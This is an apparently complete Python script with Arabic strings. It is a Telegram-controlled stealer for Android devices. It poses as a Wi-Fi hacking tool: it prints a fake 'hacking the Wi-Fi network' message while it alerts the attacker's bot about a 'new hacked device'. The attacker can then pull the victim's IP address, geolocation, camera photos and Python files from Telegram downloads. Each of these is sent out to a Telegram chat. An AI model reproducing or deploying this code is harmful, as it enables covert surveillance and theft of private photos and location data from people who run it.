import subprocess
import sys
required_libraries = ['telebot', 'requests', 'PIL']
for lib in required_libraries:
    try:
        __import__(lib)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
import telebot
import os
import requests
from PIL import Image
a = '\x1b[1;32m'
bot_token = 'توكن بوتك هنا'
chat_id = 'ايدي حسابك هنا'
bot = telebot.TeleBot(bot_token)
video_url = 'https://t.me/uiit89/102'
video_caption ='```\n👨‍💻 - عندمـا تكـون قـويا سـوف يهابـك الـجميع..!💀```\n'
bot.send_video(chat_id, video=video_url, caption=video_caption, parse_mode='MarkdownV2')
tlg1 = 'جهاز مخترق جديد \nيمكنك التحكم به من الازرار في القايمه\nاضغط هنا[/start] '
requests.get('https://api.telegram.org/bot' + str(bot_token) + '/sendMessage?chat_id=' + str(chat_id) + '&text=' + str(tlg1))
print(f'{a} جاري اختراق شبكة الوافي ارجاء الانتظار حتى يتم الفحص')
def Almunharif1():
    response = requests.get("https://api.ipify.org?format=json")
    ip_data = response.json()
    return ip_data.get('ip')

def Almunharif2():
    ip = Almunharif1()
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()
    if data['status'] == 'fail':
        return "لم يتمكن من جلب الموقع."
    latitude = data['lat']
    longitude = data['lon']
    location_map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
    return location_map_url

def Almunharif3():
    ip = Almunharif1()
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()
    if data['status'] == 'fail':
        bot.send_message(chat_id, "لم يتمكن من جلب الموقع.")
        return
    latitude = data['lat']
    longitude = data['lon']
    bot.send_location(chat_id, latitude, longitude)

def Almunharif4(image_path):
    if os.path.exists(image_path):
        with Image.open(image_path) as img:
            img.thumbnail((img.width // 4, img.height // 4), Image.LANCZOS)
            compressed_image_path = image_path.replace('.', '_compressed.')
            img.save(compressed_image_path, format='JPEG', quality=75, optimize=True)
        
        with open(compressed_image_path, 'rb') as image_file:
            bot.send_photo(chat_id, image_file)
    else:
        bot.send_message(chat_id, "الصورة غير موجودة في المسار المحدد.")

def Almunharif5(directory):
    for filename in os.listdir(directory):
        if filename.endswith(".py"):
            file_path = os.path.join(directory, filename)
            with open(file_path, 'rb') as py_file:
                bot.send_document(chat_id, py_file)

@bot.message_handler(commands=['start'])
def Almunharif6(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    ip_button = telebot.types.KeyboardButton('سحب ال IP')
    location_button = telebot.types.KeyboardButton('سحب الموقع')
    image_button = telebot.types.KeyboardButton('سحب الصور ')
    py_files_button = telebot.types.KeyboardButton('سحب ملفات .py')

    markup.add(ip_button, location_button, image_button, py_files_button)
    bot.send_message(chat_id, "مرحبًا! استخدم الأزرار التالية:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def Almunharif7(message):
    if message.text == 'سحب ال IP':
        ip_address = Almunharif1()
        bot.send_message(chat_id, f"عنوان الـ IP: {ip_address}")
    elif message.text == 'سحب الموقع':
        Almunharif3()  
    elif message.text == 'سحب الصور':
        image_path = '/storage/emulated/0/DCIM/Camera'
        Almunharif8(image_path)
    elif message.text == 'سحب ملفات .py':
        directory_path = '/storage/emulated/0/Download/Telegram'
        Almunharif5(directory_path)

def Almunharif8(directory):
    for filename in os.listdir(directory):
        if filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".jpeg"):
            file_path = os.path.join(directory, filename)
            Almunharif4(file_path)  

bot.polling()